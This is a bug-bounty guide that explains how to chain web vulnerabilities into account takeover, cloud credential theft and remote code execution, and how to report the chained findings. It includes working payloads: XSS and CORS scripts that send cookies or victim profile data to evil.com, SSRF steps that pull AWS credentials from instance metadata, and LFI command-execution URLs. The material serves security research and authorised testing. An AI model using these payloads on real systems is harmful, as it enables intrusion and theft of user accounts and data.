# Vulnerability Chaining — Escalation & Combination Guide

## Why Chaining Matters

Individual P3/P4 findings often pay $200–$500. Chained into a P1/P2 — the same bugs pay $5,000–$50,000. Chaining is what separates mid-tier hunters from top earners.

> **Core principle:** Always ask — "If I found Bug A, what second condition would make it Critical?"

---

## High-Value Chain Templates

### 🔗 Chain 1: Open Redirect → OAuth Authorization Code Theft → ATO

**Severity: Critical**

**Requirements:**
- Open redirect exists anywhere on `target.com`
- OAuth flow uses `redirect_uri` that validates `target.com` as prefix/domain

**Chain:**
1. Find open redirect: `https://target.com/login?next=https://evil.com`
2. OAuth validates `redirect_uri=https://target.com/...` (passes)
3. Craft: `?redirect_uri=https://target.com/login%3Fnext%3Dhttps%3A%2F%2Fevil.com`
4. Victim clicks → OAuth sends code to `target.com` → which redirects to `evil.com` with code in Referer header
5. Attacker exchanges code → **full account takeover**

**Report as:** OAuth Authorization Code Leakage via Open Redirect → Account Takeover

---

### 🔗 Chain 2: XSS + CSRF → Account Takeover

**Severity: High/Critical**

**Requirements:**
- Stored XSS anywhere on target (even low-impact location)
- Sensitive action (password/email change) lacks CSRF token OR has CSRF token readable via XSS

**Chain:**
1. XSS payload executes in admin/victim's browser
2. JS reads CSRF token from the DOM: `document.querySelector('[name=csrf_token]').value`
3. JS makes authenticated request to change victim's email/password
4. Attacker receives confirmation → **account takeover**

```javascript
// XSS payload for email change
fetch('/account/email', {method:'POST', credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'email=attacker@evil.com&csrf_token=' + 
    document.querySelector('[name=csrf_token]').value
}).then(()=>fetch('https://evil.com/done'));
```

---

### 🔗 Chain 3: SSRF → Cloud Metadata → Full AWS Compromise

**Severity: Critical**

**Requirements:**
- SSRF on any endpoint (even limited)
- Application hosted on AWS (EC2/ECS/Lambda) without IMDSv2

**Chain:**
1. SSRF to `http://[cloud-imds-ip]/latest/meta-data/iam/security-credentials/`
2. Get IAM role name from response
3. SSRF to `http://[cloud-imds-ip]/latest/meta-data/iam/security-credentials/<role>`
4. Extract `AccessKeyId`, `SecretAccessKey`, `Token`
5. Use credentials: `aws s3 ls --profile attacker` → full AWS API access
6. If role has `AdministratorAccess` → **full cloud account compromise**

**Report as:** SSRF → AWS Credential Exposure via IMDS → Full Cloud Account Takeover

---

### 🔗 Chain 4: LFI + File Upload → Remote Code Execution

**Severity: Critical**

**Requirements:**
- LFI vulnerability (path traversal in a file include parameter)
- File upload anywhere on the application (even image upload)

**Chain:**
1. Upload a PHP file disguised as image (`evil.jpg`) containing a minimal code execution payload — a one-liner that passes a GET parameter to an OS command function. Exact payload: HackTricks "LFI + File Upload" or PayloadsAllTheThings "File Upload".
2. Note the upload path (e.g., `/uploads/evil.jpg`)
3. Trigger LFI to include the uploaded file:
   `?page=../uploads/evil.jpg`
4. Execute command: `?page=../uploads/evil.jpg&c=id`
5. Server includes and executes the PHP → **RCE**

---

### 🔗 Chain 5: Subdomain Takeover + CORS → Credential Theft

**Severity: Critical**

**Requirements:**
- Subdomain takeover possible on `sub.target.com`
- Main app has CORS policy: `Access-Control-Allow-Origin: *.target.com` + `Access-Control-Allow-Credentials: true`

**Chain:**
1. Claim `sub.target.com` via subdomain takeover
2. Host malicious JS on `sub.target.com`:
```javascript
fetch('https://target.com/api/user/profile', {credentials:'include'})
.then(r=>r.json()).then(d=>fetch('https://evil.com/steal?d='+JSON.stringify(d)));
```
3. Trick victim into visiting `https://sub.target.com`
4. CORS allows `sub.target.com` to read `target.com` API responses with victim's cookies
5. **Full user data / API keys exfiltrated**

---

### 🔗 Chain 6: XSS → Session Token Theft → ATO

**Severity: High/Critical**

**Requirements:**
- XSS anywhere (stored or reflected with victim click)
- Session cookie NOT `HttpOnly`

**Chain:**
1. XSS payload: `fetch('https://evil.com/steal?c='+document.cookie)`
2. Victim's session token sent to attacker
3. Attacker uses token in browser → **authenticated as victim**

**Upgrade if HttpOnly is set:** Instead of stealing cookie, use XSS to perform actions directly (see Chain 2).

---

### 🔗 Chain 7: IDOR + Mass Assignment → Privilege Escalation

**Severity: High/Critical**

**Requirements:**
- IDOR on user update endpoint
- Mass assignment vulnerability (server accepts `role` field)

**Chain:**
1. IDOR: Can update other users' profiles at `PUT /api/users/<id>`
2. Mass assignment: Add `"role": "admin"` to the payload
3. Target user (or any user) gets admin role → **full admin panel access**

---

### 🔗 Chain 8: Open Redirect + Phishing (Lower Severity Chain)

**Severity: Medium** (requires social engineering — note in report)

**When:** Open redirect exists but no OAuth flow to chain

1. `https://target.com/redirect?url=https://evil-target-lookalike.com/login`
2. URL looks legitimate (starts with `target.com`)
3. Victim clicks from trusted source (email, Slack)
4. Redirected to fake login page → credentials harvested

Report this only when combined with a plausible delivery vector. Note social engineering dependency.

---

## Chaining Mindset Questions

After finding any bug, ask:

1. **"What trusted domain does this give me?"** → CORS / OAuth / SSO opportunities
2. **"What can I read?"** → Combine with IDOR, LFI, XXE
3. **"What can I execute?"** → Combine with upload, deserialize, template injection
4. **"What privileged action can this trigger?"** → Combine with CSRF, XSS
5. **"What resource can I claim?"** → Subdomain takeover + CORS, cookie scope

---

## Reporting Chained Vulnerabilities

- Report as **a single finding** with the combined severity, not two separate lower-severity bugs
- Title: `[VulnA] + [VulnB] → [Final Impact]`
- Steps to Reproduce should walk through the FULL chain sequentially
- Impact: describe the final state (ATO, RCE, data theft) — not each individual bug's impact
- Note each bug's CVE/CWE individually in the remediation section
